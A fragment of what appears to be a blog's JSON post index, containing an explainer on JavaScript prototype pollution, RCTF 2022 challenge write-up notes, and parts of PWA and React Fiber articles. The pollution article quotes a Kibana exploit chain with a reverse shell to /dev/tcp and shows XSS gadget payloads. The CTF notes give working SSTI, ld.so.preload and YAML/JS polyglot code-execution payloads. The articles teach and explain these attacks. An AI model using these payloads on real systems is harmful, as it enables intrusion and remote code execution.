mechanisms for PWA. I hope users can install PWA on their mobile phones. In short, this article mainly shares some of my experiences while working on PWA. If you have any insights, please feel free to leave a comment below and share with me. Thank you. Further reading and references: Changes to Add to Home Screen Behavior Progressive Web App Splash Screens Few Tips That Will Make Your PWA on iOS Feel Like Native PWAs are coming to iOS 11.3: Cupertino, we have a problem Will Progressive Web App be the future trend? PWA case studies A Pinterest Progressive Web App Performance Case Study","link":"/2018/10/13/en/pwa-in-action/"},{"title":"Prototype Pollution: An Attack Technique Based on JS Prototype Chain","text":"Introduction As a front-end engineer or someone who knows JavaScript, you must have heard of the term “prototype” and may even have encountered related questions during interviews. However, you may not have heard of a type of attack technique closely related to the prototype chain in JavaScript, which utilizes the characteristics of the prototype chain to carry out attacks - Prototype Pollution. This is an interesting and powerful attack technique. Prototype ChainObject-oriented programming in JavaScript is different from other programming languages. The class you see now is a syntax introduced after ES6. Before that, prototype was used to achieve the same purpose, also known as prototype inheritance. For example, have you ever wondered where the built-in functions come from when you use them? var str = \"a\" var str2 = str.repeat(5) // Where does the \"repeat\" come from? You may even find that the repeat method of two different strings is actually the same function: var str = \"a\" var str2 = \"b\" console.log(str.repeat === str2.repeat) // true Or if you have ever checked MDN, you will find that the title is not “repeat”, but String.prototype.repeat: And all of this is related to the prototype. When you call str.repeat, there is not really a method called repeat on the str instance. Then how does the JS engine work? Do you remember the concept of scope? If I use a variable and it cannot be found in the local scope, the JS engine will go to the upper scope to find it, and then keep going up the scope chain until it reaches the global scope. This is also called the scope chain. The JS engine continuously searches along this chain until it stops at the top. The concept of the prototype chain is exactly the same, but the difference is: “How does the JS engine know where the upper layer is?” If the JS engine cannot find the repeat function on str, where should it look? In JS, there is a hidden property called __proto__, and the value it stores is where the JS engine should look up. For example: var str = \"\" console.log(str.__proto__) // String.prototype What str.__proto__ points to is the “upper layer” where the JS engine should go when it cannot find anything on str. This upper layer will be String.prototype. This explains why MDN does not write repeat, but writes String.prototype.repeat, because this is the full name of the repeat function. This repeat function is actually a method on the String.prototype object. Therefore, when you call str.repeat, you are actually calling String.prototype.repeat, and this is the principle and operation mode of the prototype chain. Other things are the same as strings, such as objects: var obj = &#123;&#125; console.log(obj.a) // undefined console.log(obj.toString) // ƒ toString() &#123; [native code] &#125; Although obj is an empty object, why does obj.toString exist? Because the JS engine cannot find it on obj, it goes to obj.__proto__ to find it, and obj.__proto__ points to Object.prototype. Therefore, what obj.toString finally finds is actually Object.prototype.toString. var obj = &#123;&#125; console.log(obj.toString === Object.prototype.toString) // true Changing Properties on the Default PrototypeThe __proto__ of a string is String.prototype, the __proto__ of a number is Number.prototype, and the __proto__ of an array is Array.prototype. These associations are already pre-set to allow these class objects to share the same function. If each string has its own repeat, then there will be one million different repeats for one million strings, but they actually do the same thing, which doesn’t sound reasonable, right? Therefore, through the prototype, we can put repeat in String.prototype, so that every string that uses this function will call the same function. You may wonder, since the same function is called with the same parameters, how can the function distinguish which string is calling it? The answer is: this, let’s take an example below: String.prototype.first = function() &#123; return this[0] &#125; console.log(\"\".first()) // undefined console.log(\"abc\".first()) // a First, I added a method called first on String.prototype, so when I call &quot;&quot;.first, the JS engine finds String.prototype along __proto__, finds that String.prototype.first exists, and calls this function. And because of the rules of this, when &quot;&quot;.first() is written, the this obtained in first will be &quot;&quot;; if &quot;abc&quot;.first() is called, the this obtained in first will be &quot;abc&quot;, so we can use this to distinguish who is calling now. The way String.prototype.first is written above is to directly modify the prototype of String, add a new method, and let all strings use this new method. Although it is very convenient, this method is not recommended in development. There is a saying: Don’t modify objects you don’t own. For example, MooTools did something similar, which caused an array method to be renamed. For details, please see what I wrote before: Don’t break the Web: SmooshGate and . Then, since String.prototype can be modified, it is natural that Object.prototype can also be modified, like this: Object.prototype.a = 123 var obj = &#123;&#125; console.log(obj.a) // 123 Because Object.prototype is modified, when accessing obj.a, the JS engine cannot find the property a on obj, so it goes to obj.__proto__, which is Object.prototype, finds a on it, and returns the value of a. When the program has vulnerabilities that can be used by attackers to change properties on the prototype chain, it is called prototype pollution. Pollution means pollution. Like the example of the object above, we “polluted” the property a on the object prototype through Object.prototype.a = 123, causing unexpected behavior when accessing the object. What are the consequences of this? What can be done after polluting properties?Suppose there is a search function on the website that will take the value of q from the query string, and write it to the screen, as shown below: And the entire code is written like this: // 從網址列上拿到 query string var qs = new URLSearchParams(location.search.slice(1)) // 放上畫面，為了避免 XSS 用 innerText document.body.appendChild(createElement(&#123; tag: 'h2', innerText: `Search result for $&#123;qs.get('q')&#125;` &#125;)) // 簡化建立元件用的函式 function createElement(config)&#123; const element = document.createElement(config.tag) if (config.innerHTML) &#123; element.innerHTML = config.innerHTML &#125; else &#123; element.innerText = config.innerText &#125; return element &#125; There should be no problem with the above code, right? We wrote a function createElement to simplify some steps for us, and decided what components to generate based on the config passed in. In order to avoid XSS, we use innerText instead of innerHTML, which is foolproof and absolutely no XSS! It looks like this, but if there is a prototype pollution vulnerability before executing this code, which allows attackers to pollute properties on the prototype, what will happen? For example, like this: // 先假設可以污染原型上的屬性 Object.prototype.innerHTML = '&lt;img src=x onerror=alert(1)>' // 底下都跟剛剛一樣 var qs = new URLSearchParams(location.search.slice(1)) document.body.appendChild(createElement(&#123; tag: 'h2', innerText: `Search result for $&#123;qs.get('q')&#125;` &#125;)) function createElement(config)&#123; const element = document.createElement(config.tag) // 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true if (config.innerHTML) &#123; element.innerHTML = config.innerHTML &#125; else &#123; element.innerText = config.innerText &#125; return element &#125; The entire code only differs in the beginning, with an additional Object.prototype.innerHTML = &#39;&lt;img src=x onerror=alert(1)&gt;&#39;, and just because this line polluted innerHTML, the judgment of if (config.innerHTML) &#123; below becomes true, the behavior is changed, and it was originally innerText, now it is changed to innerHTML, and finally XSS is achieved! This is an XSS attack caused by prototype pollution. Generally speaking, prototype pollution refers to vulnerabilities in the program that allow attackers to contaminate properties on the prototype chain. However, in addition to contamination, it is also necessary to find places that can be affected in order to form a complete attack. At this point, you may be curious about what kind of code has vulnerabilities that allow attackers to modify properties on the prototype chain. How does prototype pollution occur?There are two common examples of this happening. The first is parsing the query string. You might think that the query string is just the type ?a=1&amp;b=2, what’s so difficult about it? But in fact, many query string libraries support arrays, such as ?a=1&amp;a=2 or ?a[]=1&amp;a[]=2, which can be parsed as arrays. In addition to arrays, some even support objects, like this: ?a[b][c]=1, which will produce an object &#123;a: &#123;b: &#123;c: 1&#125;&#125;&#125;. For example, the qs library supports object parsing. If you were responsible for this feature today, how would you write it? We can write a simple version that only targets objects (without considering URL encoding or arrays): function parseQs(qs) &#123; let result = &#123;&#125; let arr = qs.split('&amp;') for(let item of arr) &#123; let [key, value] = item.split('=') if (!key.endsWith(']')) &#123; // 針對一般的 key=value result[key] = value continue &#125; // 針對物件 let items = key.split('[') let obj = result for(let i = 0; i &lt; items.length; i++) &#123; let objKey = items[i].replace(/]$/g, '') if (i === items.length - 1) &#123; obj[objKey] = value &#125; else &#123; if (typeof obj[objKey] !== 'object') &#123; obj[objKey] = &#123;&#125; &#125; obj = obj[objKey] &#125; &#125; &#125; return result &#125; var qs = parseQs('test=1&amp;a[b][c]=2') console.log(qs) // &#123; test: '1', a: &#123; b: &#123; c: '2' &#125; &#125; &#125; Basically, it constructs an object based on the content inside [], and assigns values layer by layer, which doesn’t look particularly special. But! If my query string looks like this, things are different: var qs = parseQs('__proto__[a]=3') console.log(qs) // &#123;&#125; var obj = &#123;&#125; console.log(obj.a) // 3 When my query string is like this, parseQs will go and change the value of obj.__proto__.a, causing prototype pollution, which causes me to declare an empty object and print out obj.a later, but it prints out 3 because the object prototype has been contaminated. Many libraries that parse query strings have had similar issues, and below are a few examples: jquery-deparam backbone-query-parameters jquery-query-object In addition to parsing query strings, another feature that often causes this problem is merging objects. A simple merge object function looks like this: function merge(a, b) &#123; for(let prop in b) &#123; if (typeof a[prop] === 'object') &#123; merge(a[prop], b[prop]) &#125; else &#123; a[prop] = b[prop] &#125; &#125; &#125; var config = &#123; a: 1, b: &#123; c: 2 &#125; &#125; var customConfig = &#123; b: &#123; d: 3 &#125; &#125; merge(config, customConfig) console.log(config) // &#123; a: 1, b: &#123; c: 2, d: 3 &#125; &#125; If the customConfig above is controllable, then there will be a problem: var config = &#123; a: 1, b: &#123; c: 2 &#125; &#125; var customConfig = JSON.parse('&#123;\"__proto__\": &#123;\"a\": 1&#125;&#125;') merge(config, customConfig) var obj = &#123;&#125; console.log(obj.a) The reason why JSON.parse is used here is that if you write it directly like this: var customConfig = &#123; __proto__: &#123; a: 1 &#125; &#125; it won’t work, customConfig will only be an empty object. You need to use JSON.parse to create an object with a key of __proto__: var obj1 = &#123; __proto__: &#123; a: 1 &#125; &#125; var obj2 = JSON.parse('&#123;\"__proto__\": &#123;\"a\": 1&#125;&#125;') console.log(obj1) // &#123;&#125; console.log(obj2) // &#123; __proto__: &#123; a: 1 &#125; &#125; Similarly, many merge-related libraries have had this vulnerability, such as: merge lodash.merge plain-object-merge In addition to these, basically any library that operates on objects has had similar problems, such as: immer mootools ioredis Now that we know where prototype pollution problems are likely to occur, it is not enough to just contaminate properties on the prototype. We also need to find places that can be affected, that is, which places will change behavior after the properties are contaminated, so that we can execute the attack. Prototype pollution script gadgetsThese “code that can be exploited as long as we pollute the prototype” are called script gadgets. There is a GitHub repo that collects these gadgets: Client-Side Prototype Pollution. Some gadgets may be unimaginable, let me demonstrate (demo webpage): &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script src=\"https://unpkg.com/vue/dist/vue.js\">&lt;/script> &lt;/head> &lt;body> &lt;div id=\"app\"> &#123;&#123; message &#125;&#125; &lt;/div> &lt;script> // 污染 template Object.prototype.template = '&lt;svg onload=alert(1)>&lt;/svg>'; var app = new Vue(&#123; el: '#app', data: &#123; message: 'Hello Vue!' &#125; &#125;); &lt;/script> &lt;/body> &lt;/html> A seemingly harmless Vue hello world, after we pollute Object.prototype.template, becomes an XSS that allows us to insert any code. Or like this (demo webpage): &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js\">&lt;/script> &lt;/head> &lt;body> &lt;script> Object.prototype.innerText = '&lt;svg onload=alert(1)>&lt;/svg>'; document.write(sanitizeHtml('&lt;div>hello&lt;/div>')) &lt;/script> &lt;/body> &lt;/html> Although it is a library for sanitizing, after polluting Object.prototype.innerText, it becomes a good helper for XSS. Why do these problems occur? Taking sanitize-html as an example, it is because of this piece of code: if (frame.innerText &amp;&amp; !hasText &amp;&amp; !options.textFilter) &#123; result += frame.innerText; &#125; Because innerText is directly assumed to be a safe string by default, it is directly concatenated. After we pollute this property, when this property does not exist, the value of the prototype will be used, and finally it becomes an XSS. In addition to client-side, server-side Node.js also has similar risks, such as: const child_process = require('child_process') const params = ['123'] const result = child_process.spawnSync( 'echo', params ); console.log(result.stdout.toString()) // 123 This is a very simple code that executes the echo command and passes in parameters. This parameter will be automatically processed for you, so you don’t have to worry about command injection issues: const child_process = require('child_process') const params = ['123 &amp;&amp; ls'] const result = child_process.spawnSync( 'echo', params ); console.log(result.stdout.toString()) // 123 &amp;&amp; ls But if there is a prototype pollution vulnerability, it can be transformed into RCE (Remote code execution) with a slight change, allowing attackers to execute any command (assuming the attacker can control params): const child_process = require('child_process') const params = ['123 &amp;&amp; ls'] Object.prototype.shell = true // 只多了這行，參數的解析就會不一樣 const result = child_process.spawnSync( 'echo', params, &#123;timeout: 1000&#125; ); console.log(result.stdout.toString()) /* 123 index.js node_modules package-lock.json package.json */ The reason for this is that there is an option called shell in the third parameter options of child_process.spawn. Setting it to true will cause different behavior, and the official documentation also states: If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution. By combining prototype pollution with script gadgets (child_process.spawn), a highly critical vulnerability has been successfully created. SummaryIf there is a function in the program that allows attackers to pollute properties on the prototype, this vulnerability is called prototype pollution. Prototype pollution itself is not very useful and needs to be combined with other code to be effective. The code that can be combined with it is called script gadget. For example, Vue’s internal implementation will render the corresponding content based on the template property of an object, so as long as we pollute Object.prototype.template, we can create an XSS vulnerability. Or child_process.spawn uses shell, so after polluting it, it becomes an RCE vulnerability. What needs to be fixed is not the usable script gadgets, unless you change every place where the object is accessed, but this is not a fundamental solution. The real solution is to eliminate prototype pollution so that the prototype cannot be polluted, and there will be no such problems. How to defendOn any prototype pollution vulnerability page on snyk, there are defense suggestions, which can also be found in this article: Prototype pollution attack in NodeJS application. There are several common defense methods. The first is to prevent the __proto__ key when performing operations on these objects. For example, the query string parsing and merge object mentioned earlier can use this method. However, in addition to __proto__, another bypass method should also be noted, like this: var obj = &#123;&#125; obj['constructor']['prototype']['a'] = 1 var obj2 = &#123;&#125; console.log(obj2.a) // 1 Using constructor.prototype can also pollute the properties on the prototype chain, so these methods should be blocked together to be safe. For example, the prototype pollution of lodash.merge is fixed using this method. Special processing is done when the key is __proto__ or prototype. The second method is simple and easy to understand, which is to not use objects, or more precisely, “do not use objects with prototypes”. Some people may have seen a way to create objects like this: Object.create(null). This creates an empty object without the __proto__ property, which is a truly empty object with no methods. Because of this, there will be no prototype pollution problems: var obj = Object.create(null) obj['__proto__']['a'] = 1 // 根本沒有 __proto__ 這個屬性 // TypeError: Cannot set property 'a' of undefined Like the query string parsing library mentioned at the beginning, this method has been used to defend against prototype pollution. For example, query-string, which is downloaded up to 10 million times a week, has the following statement in its documentation: .parse(string, options?)Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly. The returned object is created with Object.create(null) and thus does not have a prototype. Other suggestions include using Map instead of &#123;&#125;, but I think most people are still used to using objects, and I personally think Object.create(null) is a bit better than Map. Or use Object.freeze(Object.prototype) to freeze the prototype so that it cannot be modified: Object.freeze(Object.prototype) var obj = &#123;&#125; obj['__proto__']['a'] = 1 var obj2 = &#123;&#125; console.log(obj2.a) // undefined However, one problem with Object.freeze(Object.prototype) is that if a third-party package modifies Object.prototype, such as adding a property directly to it for convenience, it will be difficult to debug because modifying it after freezing will not cause an error, it just won’t be modified successfully. So you may find that your program is broken because of a third-party package, but you don’t know why. Another possible risk I can think of is polyfill. If in the future, a polyfill is needed to be added to Object.prototype due to version issues, it will be invalidated due to the freeze. As for Node.js, you can also use the --disable-proto option to turn off Object.prototype.__proto__. For details, please refer to the official documentation. In the future, document policy may also be used for processing. You can follow this issue: Feature proposal: Mitigation for Client-Side Prototype Pollution. Real-world examplesFinally, let’s take a look at two real-world examples of prototype pollution to give you a better sense of it. The first example is a vulnerability in the well-known bug bounty platform, HackerOne (yes, it’s a vulnerability in the platform itself). The full report can be found here: #986386 Reflected XSS on www.hackerone.com via Wistia embed code On their website, they used a third-party library that contained the following code: i._initializers.initWLog = function() &#123; var e, t, n, o, a, l, s, d, u, p, c; if (t = i.url.parse(location.href), document.referrer &amp;&amp; (u = i.url.parse(document.referrer)), It parses location.href and document.referrer, both of which are controllable by attackers, and the i.url.parse function has a prototype pollution vulnerability, allowing for arbitrary property pollution. After pollution, the author discovered another piece of code that is similar to the createElement we wrote earlier. fromObject traverses properties and puts them on the DOM: if (this.chrome = r.elem.fromObject(&#123; id: r.seqId('wistia_chrome_'), class: 'w-chrome', style: r.generate.relativeBlockCss(), tabindex: -1 &#125;) Therefore, by polluting innerHTML, an attacker can use this script gadget to create an XSS vulnerability. The actual attack method is to construct a URL that can trigger prototype pollution + XSS. Simply pass the URL to someone else, and when they click on it, they will be directly attacked. The second example is a vulnerability in Kibana, and the original article can be found here: Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609). The official description of this vulnerability is as follows: An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system. In Kibana, there is a Timelion feature that allows users to enter syntax and draw charts. The following syntax can pollute the prototype: .es.props(label.__proto__.x='ABC') Polluting the prototype is just the first step. The next step is to find a script gadget. One of the Kibana scripts looks like this: var env = options.env || process.env; var envPairs = []; for (var key in env) &#123; const value = env[key]; if (value !== undefined) &#123; envPairs.push(`$&#123;key&#125;=$&#123;value&#125;`); &#125; &#125; This script will construct an environment variable that will be used to run a new node process. For example, if envPairs is a=1, it should run the command a=1 node xxx.js. Since it runs node.js, we can secretly introduce a file using the NODE_OPTIONS environment variable: // a.js console.log('a.js') // b.js console.log('b.js') // 跑這個指令，用環境變數引入 a.js NODE_OPTIONS=\"--require ./a.js\" node b.js // 輸出 a.js b.js Therefore, if we can upload a js file, we can use prototype pollution to execute this file. It sounds a bit complicated. Is there another way? Yes! A common technique is to control the content of some files, such as the PHP session content, which can be controlled, as described in this article: Triggering RCE by introducing PHP session files through LFI. Another file in Linux systems, /proc/self/environ, contains all the environment variables of the current process. If we create an environment variable called A=console.log(123)//, the contents of /proc/self/environ will change: A=console.log(123)//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8.... becomes valid JS code! So you can execute it like this: NODE_OPTIONS=\"--require /proc/self/environ\" A='console.log(1)//' node b.js The code provided by the author looks like this: .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >&amp; /dev/tcp/192.168.0.136/12345 0>&amp;1\");process.exit()//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') It pollutes two different properties, creates two environment variables, one to turn /proc/self/environ into valid JS and includes the code to execute, and the other NODE_OPTIONS uses --require to import /proc/self/environ, finally creating an RCE vulnerability that can execute any code! ConclusionBefore I got into cybersecurity, I had never heard of prototype pollution. So when I first encountered the prototype pollution vulnerability, I was a bit surprised. What surprised me was why I had never heard of it before? Compared to common vulnerabilities in front-end development such as XSS or CSRF, the notoriety of prototype pollution seems to be much lower. Some people may have first heard of this term because a certain NPM package had this vulnerability, which was fixed after upgrading to a new version, but they may not have understood the cause of the vulnerability and its potential impact. I actually quite like this vulnerability, first because I think the cause is interesting, and second because I think finding script gadgets is also interesting. In any case, I hope that through this article, more front-end engineers can become aware of this vulnerability and understand its principles and defense methods. Finally, I recommend a great article that automatically detects prototype pollution vulnerabilities and identifies problem areas, which I think takes prototype pollution to another level: A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild","link":"/2021/09/29/en/prototype-pollution/"},{"title":"RCTF 2022 Notes","text":"Here are some notes on the challenges I solved during RCTF 2022. I won’t be including those I didn’t attempt. As usual, here are the keywords: Exploiting Python’s os.path.join YAML &amp; JS polyglot strace &amp; LD_PRELOAD filechecker seriesminiCode: from flask import Flask, request, render_template, render_template_string from waitress import serve import os import subprocess app_dir = os.path.split(os.path.realpath(__file__))[0] app = Flask(__name__) app.config['UPLOAD_FOLDER'] = f'&#123;app_dir&#125;/upload/' @app.route('/', methods=['GET','POST']) def index(): try: if request.method == 'GET': return render_template('index.html',result=\"ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿\") elif request.method == 'POST': f = request.files['file-upload'] filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename) if os.path.exists(filepath) and \"..\" in filepath: return render_template('index.html', result=\"Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)\") else: f.save(filepath) file_check_res = subprocess.check_output( [\"/bin/file\", \"-b\", filepath], shell=False, encoding='utf-8', timeout=1 ) os.remove(filepath) if \"empty\" in file_check_res or \"cannot open\" in file_check_res: file_check_res=\"wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ\" return render_template_string(file_check_res) except: return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ') if __name__ == '__main__': serve(app, host=\"0.0.0.0\", port=3000, threads=1000, cleanup_interval=30) In short, you upload a file, and the server stores it. It then checks the file using /bin/file and passes the output to render_template_string. This means that if we can control the output, we can easily perform SSTI. At the time, I went to the file’s Github to look for tests that I could use. Finally, I found this: https://github.com/file/file/blob/master/tests/escapevel.result As you can see, the output includes a MIME type. This MIME type exists in the original file, so we just need to modify it. After seeing other writeups, I realized that this is the simplest solution: #!&#x2F;testabc haha&#123;&#123;7+7&#125;&#125; The output will be: a &#x2F;testabc haha&#123;&#123;7+7&#125;&#125; script text executable, ASCII text, with no line terminators plusNext is the enhanced version. The code is similar to the previous one, but the only difference is that the result is not passed to render_template_string, so SSTI is not possible. At first, I thought that this challenge would be related to how file works. I thought it might be related to how it determines the type (magic&#x2F;libmagic), and then I would find a way to upload the flag file as input and write my own judgment to slowly leak the file content. However, my teammate found a vulnerability in this part: filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename) if os.path.exists(filepath) and \"..\" in filepath: Python’s behavior is quite interesting. If the second parameter of os.path.join starts with /, it does not perform a join: os.path.join(\"/tmp/a/\", \"b\") # /tmp/a/b os.path.join(\"/tmp/a/\", \"/b\") # /b Therefore, we can upload files to any location without ... We just need to write a C program to overwrite /bin/file. promaxThis challenge fixed half of the vulnerability in the previous challenge. It only prevents uploading if the file already exists, so we cannot overwrite it. We can only upload new files. At this point, we still tried to find a solution based on the previous challenge. We looked for ways to use the existing mechanism. However, another teammate said he had a possible unexpected solution, and we solved it. The idea is to upload a file to /etc/ld.so.preload with the contents of /tmp/a.so, and then upload another file to /tmp/a.so. At this point, the binary will load the code in the file before execution. Here are the detailed answers from lavish in DC: os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], f.filename) allows for arbitrary file upload when f.filename is an absolute path. Unlike filechecker_plus, you can’t now overwrite existing files such as /bin/file, so you have to identify a way to obtain RCE by uploading a file that does not previously exist on the filesystem If you strace an execution of /bin/file, you will notice that it tries to open (like any other executable) the /etc/ld.so.preload file. Have a look with strace file -b &lt;whatever&gt; |&amp; grep ENOENT -&gt; access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory) /etc/ld.so.preload is used to specify a list of shared libraries that are preloaded when any executable is run At this point, you need to craft an .so that prints the flag, upload it to a random location on the fs, upload a /etc/ld.so.preload containing the path to your .so and execute file again so that the flag is returned Since files are deleted after being uploaded, you need to exploit a race condition. You should also ensure that file does a clean exit, otherwise subprocess.check_output will raise an exception. I haven’t actually used strace before, but I found it quite useful. Here’s a simple record of how to use it: strace file -b &lt;whatever&gt; |&amp; grep ENOENT strace file /etc/passwd 2&gt;&amp;1 | grep &quot;No such file or directory&quot; You can see which system calls were called and which files were accessed. Because this solution seems to have little to do with file, we always thought it was unexpected, but in the end we found out that it was actually the expected solution. Author’s writeup: https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022 PrettierOnlineFirst of all, I really like this question. The main code is here: const fs = require('fs') const crypto = require('crypto') const prettier = require('prettier') const &#123; nextTick, exit &#125; = require('process') require('./fw') const id = fs.readFileSync('./dist/id', 'utf-8').toString('utf-8').trim() fs.unlinkSync('./dist/id') prettier.resolveConfig(`$&#123;__dirname&#125;/.prettierrc`).then(config => &#123; const ret = prettier.format(fs.readFileSync(__filename, 'utf-8'), config) const o = crypto.createHash('sha256').update(Buffer.from(id, 'utf-8')).digest().toString('hex') fs.writeFileSync(`./dist/$&#123;id&#125;`, o, 'utf-8') fs.writeFileSync('./dist/ret.js', ret, 'utf-8') nextTick(() => &#123; throw new Error('No NextTick here!') &#125;) exit(0) &#125;) Simply put, it loads the configuration file and then runs prettier. The only thing you can control in this question is the configuration file. Then in ./fw.js, it patches require: const Module = require('module') const oldRequire = Module.prototype.require Module.prototype.require = function (id) &#123; if (typeof id !== 'string') &#123; throw new Error('Bye') &#125; const isCore = Module.isBuiltin(id) if (isCore) &#123; if (!/fs|path|util|os/.test(id)) &#123; throw new Error('Bye, ' + id) &#125; &#125; else &#123; id = Module._resolveFilename(id, this) &#125; return oldRequire.call(oldRequire, id) &#125; process.dlopen = () => &#123;&#125; Since it’s about prettier config, the first step is to look at the official documentation: https://prettier.io/docs/en/configuration.html At the time, I saw a few points: Supports YAML There is a Sharing configurations thing, which only puts a string and changes it to require that string For example, if your .prettierrc looks like this: hello When you run prettier, you will get: Error: Cannot find module &#39;hello&#39; But because there are no other files that can be controlled on the server, we didn’t realize what we could do, so we continued to study what prettier actually did, and spent some time tracing it with a debugger. We found that even if you throw JSON, it still goes to yaml.parse to parse your code (which is a useless discovery). Later, after looking around, I realized that there were plugins, so I wrote this configuration file: &#123; &quot;plugins&quot;: [&quot;abc&quot;] &#125; The error message Error: Cannot find module &#39;abc&#39; appears, indicating that prettier will require the plugin. So what do we need to require? At this point, I thought of the only file we could control: .prettierrc, which means that if .prettierrc is both a configuration file and a JS file, it will work. Fortunately, this is easy in YAML: plugins: - \".prettierrc\" abc: - console.log(1) plgusin: is a tag in JS, - is a minus sign, so there is no problem at all. At this point, I thought this question was quite interesting, combining the concept of JS+yaml polyglot with real world prettier as an example. After you can execute the code, you need to see how to bypass the require restriction. I tried import() but it didn’t work. Later, I thought that since any JS can be executed arbitrarily, I just need to change it randomly, like this: plugins: - \".prettierrc\" abc: - eval(\"h=RegExp.prototype.test;RegExp.prototype.test=function(v)&#123;return v == 'child_process' ? true : h.call(this,v)&#125;;f=require('child_process').execSync('/readflag').toString();fs=require('fs');w=fs.writeFileSync;fs.writeFileSync=function(a,b,c)&#123; if(a=='./dist/ret.js')&#123;b=f&#125;; return w.call(fs,a,b,c) &#125;\") Readable version: h = RegExp.prototype.test; RegExp.prototype.test = function(v)&#123; return v == 'child_process' ? true : h.call(this,v) &#125;; f = require('child_process').execSync('/readflag').toString(); fs = require('fs'); w = fs.writeFileSync; fs.writeFileSync=function(a,b,c)&#123; if(a == './dist/ret.js')&#123; b = f &#125;; return w.call(fs,a,b,c) &#125; First, change RegExp.test so that you can require anything, and then change the content to flag when fs.writeFileSync is called, and finally you can get the flag. Author’s writeup: https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2022/prettieronline It turns out that you don’t need to bypass require at all, you can just use module.constructor._load(&#39;child_process&#39;), because require also calls this _load method inside: https://github.com/nodejs/node/blob/265ea1e74ef429f7c27f05ac4cc9136adf2e8d9b/lib/internal/modules/cjs/loader.js // Loads a module at the given file path. Returns that module's // `exports` property. Module.prototype.require = function(id) &#123; validateString(id, 'id'); if (id === '') &#123; throw new ERR_INVALID_ARG_VALUE('id', id, 'must be a non-empty string'); &#125; requireDepth++; try &#123; return Module._load(id, this, /* isMain */ false); &#125; finally &#123; requireDepth--; &#125; &#125;; Finally, there is also a cool Nu1L payload: &#x2F;*&#x2F;..&#x2F;app&#x2F;.prettierrc #*&#x2F;const fs &#x3D; require(&#39;fs&#39;); var a &#x3D; fs.readFileSync(&quot;flag&quot;, &quot;utf-8&quot;);fs.writeFileSync(&quot;.&#x2F;dist&#x2F;ret.js&quot;,a);fs.chmodSync(&quot;.&#x2F;dist&#x2F;ret.js&quot;,0o444);process.addListener(&#39;uncaughtException&#39;, (err) &#x3D;&gt; &#123;console.log(&quot;ss&quot;,err);process.exit(0);&#125;) This utilizes the require function that outputs a string as mentioned earlier. Behind the scenes, it first uses YAML parse, so anything after the # symbol is a comment. The path part uses /* combined with the second line’s */ to become valid JS. Tql! Finally, here are other writeups that were found: RCTF 2022 WriteUp By F61d 2022RCTF WriteUp by Venom","link":"/2022/12/14/en/rctf-2022-writeup/"},{"title":"A Brief Introduction to React Fiber and Its Impact on Lifecycles","text":"IntroductionAlthough I’ve heard about React replacing its internal reconciler with something called Fiber for a long time, I’ve never studied it in detail and didn’t know what impact this change would have on higher-level components. I only began to understand it more deeply when I encountered a related bug while using Redux Form. I learned that since React officially switched to Fiber, there have been some changes to higher-level components. The title of this article, “A Brief Introduction,” is not a lie. I won’t talk about the underlying operation of Fiber (because I haven’t studied it seriously yet). I will only use plain language to explain what Fiber is, what problems it was created to solve, and its impact on React lifecycles. A Journey of a Thousand Miles Begins with a Single BugEvery time I encounter a bug, I take the opportunity to learn from it. Why? Because it’s a chance to force yourself to learn. If you can’t solve the bug, you can’t move forward. So to solve the bug, you must explore the cause, understand why the problem occurred, and figure out how to solve it. Of course, you can also find answers directly from Stack Overflow and copy and paste them to cover the problem. But after working for a while, you’ll find that not all problems can be solved that way. For example, the most difficult cookie problem I encountered a year ago was a great learning opportunity for me. So what bug did I encounter this time? Our company’s product uses redux-form, and the problem is this: I have two pages that both use the same component called FormBlock. I went to page A first, then to page B, and then back to page A. My redux-form validation failed, and no validation was executed when I submitted the form. At that time, I found several related issues, but I still wanted to find out for myself. So I went to the Redux Form source code and studied it for a few hours until I finally found the problem. When redux-form performs validation, it first checks whether the fields have been registered. If they haven’t been registered, it returns true without performing any validation. After adding a few console.log statements, I found that the problem was here, and the field was not registered. Then I looked for where the registration was done and found that in componentWillMount, an action was dispatched to register all the form fields (REGISTER_FIELD). Then in componentWillUnmount, redux-form dispatches an action called DESTROY (related code) to clear all registered fields. So far, everything seems reasonable. When I leave page B, componentWillUnmount of FormBlock is triggered, unregistering all fields. When I enter page A, componentWillMount of FormBlock is triggered, re-registering all fields. But if you open redux-devtool, you’ll find that the order is not quite what you expected: Huh? Why is it registering first and then deleting? And because it was deleted, the validation failed, and no validation logic was executed. After looking for related information, I found this Browser back button not working with react-router@4.0.0-beta.7 and react@16-alpha.4 issue and the response from gaearon, a developer of Redux and React, below: In React 15, if A is replaced by B, we unmount A, and then create and mount B: A.componentWillUnmount B.constructor B.componentWillMount B.componentDidMount In Fiber, we create B first, and only later unmount A and mount B: B.constructor B.componentWillMount A.componentWillUnmount B.componentDidMount After React 16, due to this change in order, the execution order of the redux-form lifecycle mentioned above is different from what was expected, which indirectly caused the bug mentioned at the beginning. At this point, the reason for the problem has been traced from redux-form itself to React, and then to Fiber in more detail. It seems that we can no longer avoid Fiber. First, let me 